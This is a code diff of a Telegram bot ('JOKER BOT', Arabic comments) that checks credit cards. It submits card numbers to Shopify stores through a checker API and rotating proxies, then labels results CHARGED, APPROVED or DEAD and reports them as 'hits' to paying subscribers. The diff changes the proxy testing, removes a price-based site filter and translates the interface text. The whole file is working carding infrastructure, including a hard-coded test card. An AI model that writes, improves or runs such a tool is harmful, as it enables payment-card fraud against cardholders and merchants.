@@ -24,41 +24,9 @@ ADMIN_MAX_CHECKS = 999999
 
 bot = TelegramClient('joker_bot', API_ID, API_HASH)
 
-# ==================== الملفات الأساسية للأدمن (اختيارية) ====================
-ADMIN_SITES_FILE = 'sites.txt'
-ADMIN_PROXY_FILE = 'proxy.txt'
-
 # ==================== دوال مساعدة ====================
 def is_admin(user_id):
     return user_id in ADMIN_IDS
-
-def load_admin_sites():
-    if not os.path.exists(ADMIN_SITES_FILE):
-        return []
-    try:
-        with open(ADMIN_SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
-            return [line.strip() for line in f if line.strip()]
-    except:
-        return []
-
-def save_admin_sites(sites):
-    with open(ADMIN_SITES_FILE, 'w', encoding='utf-8') as f:
-        for site in sites:
-            f.write(f"{site}\n")
-
-def load_admin_proxies():
-    if not os.path.exists(ADMIN_PROXY_FILE):
-        return []
-    try:
-        with open(ADMIN_PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
-            return [line.strip() for line in f if line.strip()]
-    except:
-        return []
-
-def save_admin_proxies(proxies):
-    with open(ADMIN_PROXY_FILE, 'w', encoding='utf-8') as f:
-        for proxy in proxies:
-            f.write(f"{proxy}\n")
 
 USERS_FILE = 'users.json'
 CODES_FILE = 'codes.json'
@@ -70,7 +38,7 @@ def get_user_proxy_file(user_id):
     return f"user_{user_id}_proxy.txt"
 
 def load_user_sites(user_id):
-    """تحميل مواقع المستخدم - الأدمن عادي زيه زي أي مستخدم"""
+    """تحميل مواقع المستخدم (الأدمن والمستخدم زي بعض)"""
     file_path = get_user_sites_file(user_id)
     if not os.path.exists(file_path):
         return []
@@ -81,14 +49,14 @@ def load_user_sites(user_id):
         return []
 
 def save_user_sites(user_id, sites):
-    """حفظ مواقع المستخدم - الأدمن عادي زيه زي أي مستخدم"""
+    """حفظ مواقع المستخدم"""
     file_path = get_user_sites_file(user_id)
     with open(file_path, 'w', encoding='utf-8') as f:
         for site in sites:
             f.write(f"{site}\n")
 
 def load_user_proxies(user_id):
-    """تحميل بروكسيات المستخدم - الأدمن عادي زيه زي أي مستخدم"""
+    """تحميل بروكسيات المستخدم"""
     file_path = get_user_proxy_file(user_id)
     if not os.path.exists(file_path):
         return []
@@ -99,7 +67,7 @@ def load_user_proxies(user_id):
         return []
 
 def save_user_proxies(user_id, proxies):
-    """حفظ بروكسيات المستخدم - الأدمن عادي زيه زي أي مستخدم"""
+    """حفظ بروكسيات المستخدم"""
     file_path = get_user_proxy_file(user_id)
     with open(file_path, 'w', encoding='utf-8') as f:
         for proxy in proxies:
@@ -242,9 +210,10 @@ async def create_user_if_not_exists(user_id, username):
             'blocked': False
         }
         save_users(users)
+        # إشعار الأدمن
         for admin_id in ADMIN_IDS:
             try:
-                await bot.send_message(admin_id, premium_emoji(f"🆕 <b>مستخدم جديد دخل البوت!</b>\n\n🆔 المعرف: <code>{user_id}</code>\n👤 اليوزر: @{username}\n📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"), parse_mode='html')
+                await bot.send_message(admin_id, premium_emoji(f"🆕 <b>New user joined!</b>\n\n🆔 ID: <code>{user_id}</code>\n👤 Username: @{username}\n📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"), parse_mode='html')
             except:
                 pass
 
@@ -339,12 +308,12 @@ def get_commands_keyboard():
 
 def get_admin_menu_keyboard():
     return [
-        [Button.inline("📊 إحصائيات", b"admin_stats")],
-        [Button.inline("📢 إذاعة", b"admin_broadcast")],
-        [Button.inline("🔨 حظر", b"admin_block")],
-        [Button.inline("🔓 إلغاء حظر", b"admin_unblock")],
-        [Button.inline("📈 تعديل الحد", b"admin_set_limit")],
-        [Button.inline("🔙 رجوع", b"main_menu")]
+        [Button.inline("📊 Stats", b"admin_stats")],
+        [Button.inline("📢 Broadcast", b"admin_broadcast")],
+        [Button.inline("🔨 Block", b"admin_block")],
+        [Button.inline("🔓 Unblock", b"admin_unblock")],
+        [Button.inline("📈 Set Limit", b"admin_set_limit")],
+        [Button.inline("🔙 Back", b"main_menu")]
     ]
 
 async def get_user_stats_text(user_id, username):
@@ -358,157 +327,37 @@ async def get_user_stats_text(user_id, username):
     proxies_count = len(load_user_proxies(user_id))
     
     if is_blocked:
-        status = "🚫 محظور"
+        status = "🚫 Blocked"
     elif is_admin(user_id):
-        status = "👑 أدمن | غير محدود"
+        status = "👑 ADMIN | Unlimited"
     elif is_premium_user:
-        status = f"⭐ مميز | {checks_left} عملية متبقية"
+        status = f"⭐ PREMIUM | {checks_left} left"
     else:
-        status = "🆓 تجريبي | يرجى الاشتراك"
+        status = "🆓 FREE | Subscribe /subscribe"
     
-    text = f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 , @{username}!\n\n"
-    text += f" 𝗔𝗰𝗰𝗼𝘂𝗻𝘁   🚀 \n\n"
-    text += f"    ┣ 📝 𝗣𝗹𝗮𝗻 {status}\n"
-    text += f"    ┣ 🌐 𝗦𝗶𝘁𝗲𝘀  {sites_count}\n"
-    text += f"    ┣ 🔌 𝗣𝗿𝗼𝘅𝗶𝗲𝘀  {proxies_count}\n"  
-    text += f"    ┣ 💥 𝗛𝗶𝘁𝘀 {user_data.get('successful_checks', 0)}\n"
-    text += f"    ┗ 📈 𝗧𝗼𝘁𝗮𝗹 {total_checks}\n\n\n"
-    text += f"💡 𝗠𝗮𝗱𝗲 𝗯𝘆: @Joker"
+    text = f"👋 Welcome , @{username}!\n\n"
+    text += f" Account 🚀 \n\n"
+    text += f"    ┣ 📝 Plan: {status}\n"
+    text += f"    ┣ 🌐 Sites: {sites_count}\n"
+    text += f"    ┣ 🔌 Proxies: {proxies_count}\n"  
+    text += f"    ┣ 💥 Hits: {user_data.get('successful_checks', 0)}\n"
+    text += f"    ┗ 📈 Total: {total_checks}\n\n\n"
+    text += f"💡 Made by: @Joker"
     return text
 
-# ==================== دوال فحص البروكسيات الدقيق ====================
+# ==================== دوال API الرئيسية ====================
 
-PROXY_TEST_SITES = [
-    "musicstore.myshopify.com",
-    "gymshark.com",
-    "colourpop.com"
-]
-
-async def check_api_alive():
-    """التحقق من أن الـ API شغال"""
+async def check_api_connection():
+    """تأكد من أن الـ API شغال"""
     try:
-        test_site = "musicstore.myshopify.com"
-        test_card = "4031630422575208|01|2030|280"
-        url = f'{CHECKER_API_URL}/shopify?site={test_site}&cc={test_card}'
-        timeout = aiohttp.ClientTimeout(total=15)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url) as resp:
-                return resp.status == 200
-    except:
-        return False
-
-async def test_proxy_single(proxy, max_retries=2):
-    """فحص بروكسي واحد مع إعادة المحاولة"""
-    test_card = "4031630422575208|01|2030|280"
-    
-    for retry in range(max_retries):
-        for test_site in PROXY_TEST_SITES:
-            try:
-                url = f'{CHECKER_API_URL}/shopify?site={test_site}&cc={test_card}&proxy={proxy}'
-                timeout = aiohttp.ClientTimeout(total=30)
-                async with aiohttp.ClientSession(timeout=timeout) as session:
-                    async with session.get(url) as resp:
-                        if resp.status == 200:
-                            try:
-                                raw = await resp.json()
-                                if raw.get('Status', False):
-                                    return {
-                                        'proxy': proxy,
-                                        'status': 'alive',
-                                        'success_rate': 1,
-                                        'test_site': test_site,
-                                        'error': None
-                                    }
-                            except:
-                                pass
-            except asyncio.TimeoutError:
-                print(f"[DEBUG] Proxy {proxy[:30]}... timeout on {test_site}")
-                continue
-            except Exception as e:
-                print(f"[DEBUG] Proxy {proxy[:30]}... error: {str(e)[:50]}")
-                continue
-        
-        if retry < max_retries - 1:
-            await asyncio.sleep(1)
-    
-    return {
-        'proxy': proxy,
-        'status': 'dead',
-        'success_rate': 0,
-        'error': 'Failed after retries'
-    }
-
-async def test_proxy_batch(proxies, batch_size=10):
-    """فحص مجموعة بروكسيات بشكل متوازي"""
-    # التحقق من اتصال الـ API أولاً
-    api_ok = await check_api_alive()
-    if not api_ok:
-        print("[ERROR] API is not responding!")
-        return [{'proxy': p, 'status': 'dead', 'error': 'API not responding'} for p in proxies]
-    
-    results = []
-    total = len(proxies)
-    
-    for i in range(0, total, batch_size):
-        batch = proxies[i:i+batch_size]
-        tasks = [test_proxy_single(proxy, max_retries=2) for proxy in batch]
-        batch_results = await asyncio.gather(*tasks)
-        results.extend(batch_results)
-        await asyncio.sleep(0.5)  # تأخير بين المجموعات
-    
-    return results
-
-# ==================== دوال فحص المواقع حسب السعر ====================
-
-PRICE_RANGES = {
-    "1": {"name": "10$-15$", "min": 10, "max": 15},
-    "2": {"name": "20$-30$", "min": 20, "max": 30},
-    "3": {"name": "40$+", "min": 40, "max": 999999}
-}
-
-async def get_site_min_price(site_url):
-    """جلب أقل سعر في الموقع"""
-    try:
-        if site_url.startswith('https://') or site_url.startswith('http://'):
-            site_url = site_url.replace('https://', '').replace('http://', '').rstrip('/')
-        
-        url = f'https://{site_url}/products.json?limit=5'
         timeout = aiohttp.ClientTimeout(total=10)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url) as resp:
-                if resp.status != 200:
-                    return 999999
-                data = await resp.json()
-                products = data.get('products', [])
-                min_price = 999999
-                for product in products:
-                    variants = product.get('variants', [])
-                    for variant in variants:
-                        try:
-                            price = float(variant.get('price', 999999))
-                            if price < min_price:
-                                min_price = price
-                        except:
-                            pass
-                return min_price
+            async with session.get(f'{CHECKER_API_URL}/shopify?site=musicstore.myshopify.com&cc=4031630422575208|01|2030|280') as resp:
+                if resp.status == 200:
+                    return True
+                return False
     except:
-        return 999999
-
-async def filter_sites_by_price(sites, price_range_key):
-    """تصفية المواقع حسب السعر المختار"""
-    price_range = PRICE_RANGES.get(price_range_key)
-    if not price_range:
-        return sites
-    
-    filtered_sites = []
-    for site in sites:
-        min_price = await get_site_min_price(site)
-        if min_price <= price_range["max"]:
-            filtered_sites.append(site)
-    
-    return filtered_sites
-
-# ==================== دوال API الرئيسية ====================
+        return False
 
 async def test_site(site, proxy):
     test_card = "4031630422575208|01|2030|280"
@@ -518,7 +367,7 @@ async def test_site(site, proxy):
         url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
         if proxy:
             url += f'&proxy={proxy}'
-        timeout = aiohttp.ClientTimeout(total=60)
+        timeout = aiohttp.ClientTimeout(total=30)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as resp:
                 if resp.status != 200:
@@ -532,8 +381,47 @@ async def test_site(site, proxy):
                 except:
                     return {'site': site, 'status': 'dead'}
     except Exception as e:
-        print(f"[DEBUG] Site test error: {e}")
         return {'site': site, 'status': 'dead'}
+
+async def test_proxy(proxy):
+    """فحص بروكسي واحد - بسيط وسريع مع إظهار سبب الفشل"""
+    test_card = "4031630422575208|01|2030|280"
+    test_site = "musicstore.myshopify.com"
+    
+    try:
+        url = f'{CHECKER_API_URL}/shopify?site={test_site}&cc={test_card}'
+        if proxy:
+            url += f'&proxy={proxy}'
+        
+        timeout = aiohttp.ClientTimeout(total=20)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return {'proxy': proxy, 'status': 'dead', 'reason': f'HTTP {resp.status}'}
+                try:
+                    raw = await resp.json()
+                    if raw.get('Status', False):
+                        return {'proxy': proxy, 'status': 'alive', 'reason': 'OK'}
+                    else:
+                        return {'proxy': proxy, 'status': 'dead', 'reason': f"API returned Status=false, Response: {raw.get('Response', 'Unknown')}"}
+                except Exception as e:
+                    return {'proxy': proxy, 'status': 'dead', 'reason': f'JSON Error: {str(e)[:50]}'}
+    except asyncio.TimeoutError:
+        return {'proxy': proxy, 'status': 'dead', 'reason': 'Timeout (20s)'}
+    except aiohttp.ClientError as e:
+        return {'proxy': proxy, 'status': 'dead', 'reason': f'Connection error: {str(e)[:50]}'}
+    except Exception as e:
+        return {'proxy': proxy, 'status': 'dead', 'reason': f'Error: {str(e)[:50]}'}
+
+async def test_proxy_with_retry(proxy, max_retries=2):
+    """فحص بروكسي مع إعادة المحاولة"""
+    for attempt in range(max_retries):
+        result = await test_proxy(proxy)
+        if result['status'] == 'alive':
+            return result
+        if attempt < max_retries - 1:
+            await asyncio.sleep(1)
+    return result
 
 async def check_card(card, site, proxy):
     try:
@@ -548,7 +436,7 @@ async def check_card(card, site, proxy):
         if proxy:
             url += f'&proxy={proxy}'
         
-        timeout = aiohttp.ClientTimeout(total=90)
+        timeout = aiohttp.ClientTimeout(total=120)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as resp:
                 if resp.status != 200:
@@ -573,7 +461,6 @@ async def check_card(card, site, proxy):
         
         response_upper = response_msg.upper()
         
-        # Charged
         if any(kw in response_upper for kw in charged_keywords):
             print(f"[✓] CHARGED: {card} | {response_msg}")
             return {
@@ -584,7 +471,6 @@ async def check_card(card, site, proxy):
                 'gateway': gateway, 
                 'price': price
             }
-        # Approved (Insufficient Funds + 3D Secure)
         elif any(kw in response_upper for kw in approved_keywords):
             print(f"[!] APPROVED: {card} | {response_msg}")
             return {
@@ -595,7 +481,6 @@ async def check_card(card, site, proxy):
                 'gateway': gateway, 
                 'price': price
             }
-        # أي حاجة تانية = Dead
         else:
             print(f"[✗] DEAD: {card} | {response_msg}")
             return {
@@ -679,7 +564,6 @@ def is_dead_site_error(error_msg):
     return any(keyword in error_lower for keyword in _DEAD_INDICATORS)
 
 async def send_hit_message(user_id, result, hit_type):
-    """إرسال الـ Hit بدون اسم المتجر"""
     if hit_type == 'Charged':
         emoji = "💎"
         status_text = "𝐂𝐇𝐀𝐑𝐆𝐄𝐃"
@@ -799,7 +683,7 @@ async def handle_menu_callback(event):
 └ <code>/mcancel</code> - Cancel mass check
 
 <b>⭐ SUBSCRIPTION</b>
-├ <code>/subscribe</code> - Buy subscription with stars
+├ <code>/subscribe</code> - Buy subscription
 └ <code>/redeem code</code> - Redeem activation code
 
 <b>📝 FORMATS</b>
@@ -1103,73 +987,27 @@ async def add_sites_file_command(event):
         await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
         return
     
-    # سؤال المستخدم عن فئة السعر
-    price_keyboard = [
-        [Button.inline("10$-15$", b"price_1"), Button.inline("20$-30$", b"price_2")],
-        [Button.inline("40$+", b"price_3"), Button.inline("Skip Filter", b"price_skip")]
-    ]
-    
-    await event.reply(premium_emoji("💰 <b>Select price range to filter sites:</b>\n\nSites with products above selected range will be removed.\n\nChoose 'Skip Filter' to add all sites."), buttons=price_keyboard, parse_mode='html')
-    
-    # تخزين مؤقت لمعالجة الملف لاحقاً
-    user_pending_sites[user_id] = {
-        'file_path': await reply_msg.download_media(),
-        'user_id': user_id
-    }
-
-@bot.on(events.CallbackQuery(pattern=b"price_\\d+|price_skip"))
-async def handle_price_selection(event):
-    user_id = event.sender_id
-    data = event.data.decode('utf-8')
-    
-    if user_id not in user_pending_sites:
-        await event.answer("No pending file. Please use /addsites again.", alert=True)
-        return
-    
-    pending = user_pending_sites.pop(user_id)
-    file_path = pending['file_path']
-    
+    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')
+    file_path = await reply_msg.download_media()
     async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
         content = await f.read()
-    
     sites = [line.strip() for line in content.split('\n') if line.strip()]
     sites = [s.replace('https://', '').replace('http://', '').rstrip('/') for s in sites]
-    
     if not sites:
-        await event.edit(premium_emoji("❌ No valid sites found in file."), parse_mode='html')
+        await status_msg.edit(premium_emoji("❌ No valid sites found in file."), parse_mode='html')
         os.remove(file_path)
         return
-    
     os.remove(file_path)
-    
     current_sites = load_user_sites(user_id)
-    
-    # تطبيق فلتر السعر
-    if data != "price_skip":
-        price_key = data.split('_')[1]
-        await event.edit(premium_emoji(f"🔄 Filtering sites by price ({PRICE_RANGES[price_key]['name']})..."), parse_mode='html')
-        
-        filtered_sites = []
-        for site in sites:
-            min_price = await get_site_min_price(site)
-            if min_price <= PRICE_RANGES[price_key]['max']:
-                filtered_sites.append(site)
-        
-        sites = filtered_sites
-        await event.edit(premium_emoji(f"✅ Price filter applied: {len(sites)} sites remaining."), parse_mode='html')
-    
-    # إضافة المواقع بدون فحص (المستخدم يستخدم /sitecheck لاحقاً)
     new_sites = [s for s in sites if s not in current_sites]
-    
     if not new_sites:
-        await event.edit(premium_emoji("⚠️ All sites already exist."), parse_mode='html')
+        await status_msg.edit(premium_emoji("⚠️ All sites already exist."), parse_mode='html')
         return
     
+    # إضافة المواقع مباشرة بدون فحص
     all_sites = list(set(current_sites + sites))
     save_user_sites(user_id, all_sites)
-    
-    await event.edit(premium_emoji(f"✅ <b>Sites added!</b>\n\nAdded {len(new_sites)} new sites.\nTotal sites: {len(all_sites)}\n\nUse /sitecheck to test them."), parse_mode='html')
-    await event.answer()
+    await status_msg.edit(premium_emoji(f"✅ <b>Sites Added!</b>\n\nAdded {len(new_sites)} new sites.\nTotal sites: {len(all_sites)}\n\nUse /sitecheck to test them."), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/addproxy'))
 async def add_proxy_command(event):
@@ -1244,11 +1082,11 @@ async def check_single_proxy_command(event):
         return
     status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
     try:
-        result = await test_proxy_single(proxy)
+        result = await test_proxy_with_retry(proxy)
         if result['status'] == 'alive':
-            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
+            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>\nReason: {result['reason']}"), parse_mode='html')
         else:
-            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>\n\nMake sure the API (jo.py) is running on port 5000."), parse_mode='html')
+            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>\nReason: {result['reason']}"), parse_mode='html')
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
 
@@ -1305,37 +1143,48 @@ async def proxy_check_command(event):
         await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
         return
     
+    # تأكد من اتصال API
+    api_ok = await check_api_connection()
+    if not api_ok:
+        await event.reply(premium_emoji("❌ <b>API is not responding!</b>\n\nMake sure jo.py is running on port 5000"), parse_mode='html')
+        return
+    
     proxies = load_user_proxies(user_id)
     if not proxies:
         await event.reply(premium_emoji("❌ No proxies to check."), parse_mode='html')
         return
     
-    # التحقق من أن الـ API شغال أولاً
-    status_msg = await event.reply(premium_emoji("🔄 Checking API connection..."), parse_mode='html')
+    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."), parse_mode='html')
     
-    api_ok = await check_api_alive()
-    if not api_ok:
-        await status_msg.edit(premium_emoji("❌ <b>API is not responding!</b>\n\nMake sure jo.py is running on port 5000.\n\nCommand: <code>python jo.py</code>"), parse_mode='html')
-        return
+    alive_proxies = []
+    dead_proxies = []
+    dead_reasons = []
+    batch_size = 30
     
-    await status_msg.edit(premium_emoji(f"🔥 Checking {len(proxies)} proxies (3 test sites each, with retry)..."), parse_mode='html')
-    
-    results = await test_proxy_batch(proxies)
-    alive_proxies = [r['proxy'] for r in results if r['status'] == 'alive']
-    dead_proxies = [r['proxy'] for r in results if r['status'] == 'dead']
-    
-    # عرض النتائج التفصيلية
-    result_text = f"🔥 Proxy Check Results:\n\n"
-    result_text += f"<b>Checked:</b> {len(proxies)}\n"
-    result_text += f"<b>Alive:</b> {len(alive_proxies)}\n"
-    result_text += f"<b>Dead:</b> {len(dead_proxies)}\n\n"
-    
-    if dead_proxies and len(dead_proxies) <= 10:
-        result_text += "<b>Dead proxies (first 10):</b>\n"
-        for p in dead_proxies[:10]:
-            result_text += f"• <code>{p[:50]}</code>\n"
-    
-    await status_msg.edit(premium_emoji(result_text), parse_mode='html')
+    for i in range(0, len(proxies), batch_size):
+        batch = proxies[i:i + batch_size]
+        tasks = [test_proxy_with_retry(proxy) for proxy in batch]
+        results = await asyncio.gather(*tasks)
+        
+        for res in results:
+            if res['status'] == 'alive':
+                alive_proxies.append(res['proxy'])
+            else:
+                dead_proxies.append(res['proxy'])
+                dead_reasons.append(f"• {res['proxy'][:30]}... -> {res['reason']}")
+        
+        # عرض التقدم مع الأسباب
+        reasons_text = "\n".join(dead_reasons[-5:]) if dead_reasons else "None"
+        await status_msg.edit(
+            premium_emoji(
+                f"🔥 Checking proxies...\n\n"
+                f"<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n"
+                f"<b>Alive:</b> {len(alive_proxies)}\n"
+                f"<b>Dead:</b> {len(dead_proxies)}\n\n"
+                f"<b>Recent failures:</b>\n<code>{reasons_text}</code>"
+            ),
+            parse_mode='html'
+        )
     
     save_user_proxies(user_id, alive_proxies)
     
@@ -1345,9 +1194,7 @@ async def proxy_check_command(event):
 <b>Alive:</b> {len(alive_proxies)}
 <b>Removed:</b> {len(dead_proxies)}
 
-<code>proxy.txt</code> has been updated with only working proxies.
-
-💡 Tip: Make sure jo.py is running on port 5000."""
+<code>proxy.txt</code> has been updated with only working proxies."""
     
     await status_msg.edit(premium_emoji(summary), parse_mode='html')
 
@@ -1565,7 +1412,7 @@ async def handle_mode_selection(event):
         os.remove(file_path)
         return
     
-    # الحد الأقصى للمستخدم العادي
+    # الحد الأقصى للمستخدم العادي (5000 فحص)
     if not is_admin(user_id):
         checks_left = get_user_checks_left(user_id)
         if len(cards) > checks_left:
@@ -2089,15 +1936,6 @@ async def main():
     print("⚡ JOKER BOT")
     print(f"📡 API URL: {CHECKER_API_URL}")
     print("=" * 50)
-    
-    # التحقق من اتصال API عند التشغيل
-    api_ok = await check_api_alive()
-    if api_ok:
-        print("✅ API is connected and working!")
-    else:
-        print("⚠️ WARNING: API is not responding! Make sure jo.py is running on port 5000")
-        print("   Command: python jo.py")
-    
     await bot.run_until_disconnected()
 
 if __name__ == "__main__":
